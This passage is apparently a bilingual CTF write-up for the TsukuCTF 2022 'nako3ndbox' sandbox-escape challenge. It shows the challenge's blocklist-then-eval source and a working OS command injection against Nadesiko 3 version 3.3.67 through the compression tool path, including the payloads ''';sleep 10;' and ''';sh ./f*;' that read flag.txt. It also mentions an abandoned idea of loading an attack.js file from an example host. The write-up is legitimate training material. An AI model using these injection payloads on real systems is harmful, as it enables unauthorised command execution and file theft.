</span><span></span><span class="token token" style="color:#ccc">[</span><span>実行時エラー</span><span class="token token" style="color:#ccc">]</span><span>app</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span>行目</span><span class="token token" style="color:#ccc">)</span><span>: Command failed: </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">\</span><span>&#x27;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sh</span><span> ./f*</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> x </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -o</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -y
</span>/bin/sh: &#x27;: not found
<span>./flag.txt: line </span><span class="token token" style="color:#f08d49">1</span><span>: TsukuCTF22</span><span class="token token" style="color:#ccc">{</span><span>y0u_jump3d_0u7_0f_j4p4n353</span><span class="token token" style="color:#ccc">}</span><span>: not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span>~~~</code></div></pre>
<p>Now you get the FLAG.</p>
<h2>TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}</h2></div><div class="x2b8uid">© 2021-<!-- -->2023<!-- --> SecHack365-Fans All Right Reserved.</div></div></div><script id="__NEXT_DATA__" type="application/json" crossorigin="">{"props":{"pageProps":{"postData":{"id":"nako3ndbox","contentHtml":"# nako3ndbox\n\n## 問題文\n\nに・ほ・ん・ご・で・あ・そ・ぼ\\\n`nc tsukuctf.sechack365.com 31418`\n\n## 難易度\n\n**medium**\n\n## 作問にあたって\n\nなでしこ 3 の修正済みである脆弱性を使った Jail 問題です。\\\nもともとは最新版を使い`！「http://ctf.example.com/attack.js」を取り込み`で RCE させようと思っていましたが、`ナデシコする`でうまく動かないため、見つけた脆弱性を用いる事にしました。\\\n一応、CVE-2022-41642 のバイパスなのでまだ CVE はついていません(頑張れば脆弱性なしで解けます)。\n\n## 解法\n\nなでしこ 3 を用いた Jail 問題のようだ。\\\n配布されたソースは以下のようであった。\n\n```bash\n「------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------」と言う\n\n「日本語コード：」と尋ねる\nそれを入力に代入\n\nブラックリスト＝「読、開、保存、実行、起動、サーバ、フォルダ、ファイル、ナデシコ、ディレクトリ、flag」を「、」で区切る\n\nブラックリスト！＝空の間\n　　ブラックリストの０から１を配列取り出す\n　　もし（入力でそれの出現回数）！＝０ならば\n　　　　「日本語の世界からは出しませんよ！！！」と言う\n　　　　終了する\n　　ここまで\nここまで\n\n「｛入力｝」をナデシコする\n\n終了する\n```\n\n入力された文字列をブラックリストで検証し、eval にあたる`ナデシコする`で実行している。\\\nブラックリストがない場合、`「ls」を起動`などで RCE 可能だが今回は難しい。\\\nここで配布されたファイルより、なでしこ 3 が最新版でなく、3.3.67 である点に注目する。\\\nGitHub の Issues を見てやると[cnako3 の圧縮解凍の問題](https://github.com/kujirahand/nadesiko3/issues/1325)が見つかる。\\\n複数のシングルクォートを圧縮解凍系の処理に含めることで、OS コマンドインジェクションが可能なようだ。\\\nこの修正を参考に任意コード実行を行う。\\\n今回は以下のように`圧縮解凍ツールパス`の引数としてコマンドを与える。\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sleep 10;'' x '' -o'' -y\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n~~~\n```\n\n`sleep 10`を行うと 10 秒スリープした。\\\nフラグは`flag.txt`にあるので読みだせばよいが、`flag`がブラックリストにある。\\\n`./f*`などで回避してやればよい。\\\nコマンドの実行結果がなぜか出てこないことがあるので、`sh`に渡してエラーとして吐き出せばよい。\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sh ./f*;'' x '' -o'' -y\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n~~~\n```\n\nflag が得られた。\n\n## TsukuCTF22{y0u\\_jump3d\\_0u7\\_0f\\_j4p4n353}\n\n## Abstract\n\nThis is a Jail related to a known vulnerability in なでしこ 3\nFirst I intended to make a RCE question by `！「http://ctf.example.com/attack.js」を取り込み`. However, `ナデシコする` didn't work well. Thats why I use the vulnerability instead.\n\n## Solve\n\nThis seems Jail with なでしこ 3.\nThe ditributed source code is the following.\n\n```\n```\n\n\u003c!-- XXXX:なでしこソース追加 --\u003e\n\nThis program execute the given strings with `ナデシコする` which corresponds to the eval command after given strings are checked.\nYou could RCE by `「ls」を起動` if it were not checked. We can't do this for this case.\nBtw, this is ver 3.3.67 which is not the latest one and this has [an issue related to cnako3](https://github.com/kujirahand/nadesiko3/issues/1325)\nThis is OS command injection. You can use this vulnerability.\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sleep 10;'' x '' -o'' -y\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n~~~\n```\n\n`sleep 10` make the thread sleep for 10 seconds.\nAs the `flag` is blacklisted, you should specify like `./f*` to get `flag.txt`.\nI don't know why but sometimes we can't get the result. So get the result as Error Message through `sh` instead.\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sh ./f*;'' x '' -o'' -y\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n~~~\n```\n\nNow you get the FLAG.\n\n## TsukuCTF22{y0u\\_jump3d\\_0u7\\_0f\\_j4p4n353}\n","title":"nako3ndbox","description":"なでしこのサンドボックス問題","author":"Satoki","genre":"Misc","solver":6,"point":500}},"__N_SSG":true},"page":"/ctf/TsukuCTF2022/[id]","query":{"id":"nako3ndbox"},"buildId":"pGek_3YC8jk9kHJKsQkjz","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>